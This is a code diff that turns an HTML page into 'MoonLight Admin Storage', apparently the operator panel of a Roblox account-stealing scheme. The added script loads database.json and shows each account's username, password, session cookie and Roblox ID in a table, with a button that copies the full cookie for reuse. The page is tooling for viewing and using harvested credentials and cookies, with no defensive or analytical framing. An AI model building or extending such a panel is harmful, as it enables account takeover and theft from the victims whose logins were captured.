@@ -3,9 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoonLight PANEL</title>
+    <title>MoonLight Admin Storage</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: gray;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+            background-color: white;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+            vertical-align: top;
+        }
+        th {
+            background-color: #f4f4f4;
+        }
+        pre {
+            white-space: pre-wrap; 
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        .copy-btn {
+            cursor: pointer;
+            padding: 5px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+        .copy-btn:hover {
+            background-color: #0056b3;
+        }
+        h1 {
+            text-align: center;
+        }
+        .filters {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .filter-btn {
+            padding: 8px 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .filter-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
+    <h1>Accounts</h1>
+    <div class="filters">
+        <button class="filter-btn" onclick="sortByEarliest()">Sort by Earliest</button>
+        <button class="filter-btn" onclick="sortByLatest()">Sort by Latest</button>
+    </div>
     
+    <table id="json-table">
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Cookie</th>
+                <th>Created (IN GMT+2 TIME)</th>
+                <th>Roblox ID</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Data will be inserted here -->
+        </tbody>
+    </table>
+
+    <script>
+        let originalData = [];
+        let sortedData = [];
+        let sortOrder = 'earliest'; // Default sort order
+
+        fetch('database.json')
+            .then(response => response.json())
+            .then(data => {
+                originalData = data;
+                sortedData = data;
+                populateTable(data);
+            })
+            .catch(error => {
+                console.error('Error fetching JSON:', error);
+                document.querySelector('#json-table tbody').innerHTML = '<tr><td colspan="6">Error loading JSON.</td></tr>';
+            });
+
+        function populateTable(data) {
+            const tableBody = document.querySelector('#json-table tbody');
+            tableBody.innerHTML = '';
+
+            data.forEach(item => {
+                const row = document.createElement('tr');
+
+                const usernameCell = document.createElement('td');
+                usernameCell.textContent = item.username;
+                row.appendChild(usernameCell);
+
+                const passwordCell = document.createElement('td');
+                passwordCell.textContent = item.password;
+                row.appendChild(passwordCell);
+
+                const cookieCell = document.createElement('td');
+                const cookieText = item.cookie;
+                const truncatedCookie = cookieText.length > 50 ? cookieText.substring(0, 47) + '...' : cookieText;
+                cookieCell.innerHTML = `
+                    <pre>${truncatedCookie}</pre>
+                    <button class="copy-btn" onclick="copyToClipboard('${cookieText}')">Copy</button>
+                `;
+                row.appendChild(cookieCell);
+
+                const createdCell = document.createElement('td');
+                createdCell.textContent = item.created;
+                row.appendChild(createdCell);
+
+                const robloxIdCell = document.createElement('td');
+                robloxIdCell.textContent = item.roblox_id;
+                row.appendChild(robloxIdCell);
+
+
+                tableBody.appendChild(row);
+            });
+        }
+
+        function sortByEarliest() {
+            sortOrder = 'earliest';
+            sortedData = [...originalData].sort((a, b) => new Date(a.created) - new Date(b.created));
+            populateTable(sortedData);
+        }
+
+        function sortByLatest() {
+            sortOrder = 'latest';
+            sortedData = [...originalData].sort((a, b) => new Date(b.created) - new Date(a.created));
+            populateTable(sortedData);
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Cookie copied to clipboard!');
+            }).catch(err => {
+                console.error('Error copying text: ', err);
+            });
+        }
+    </script>
 </body>
 </html>
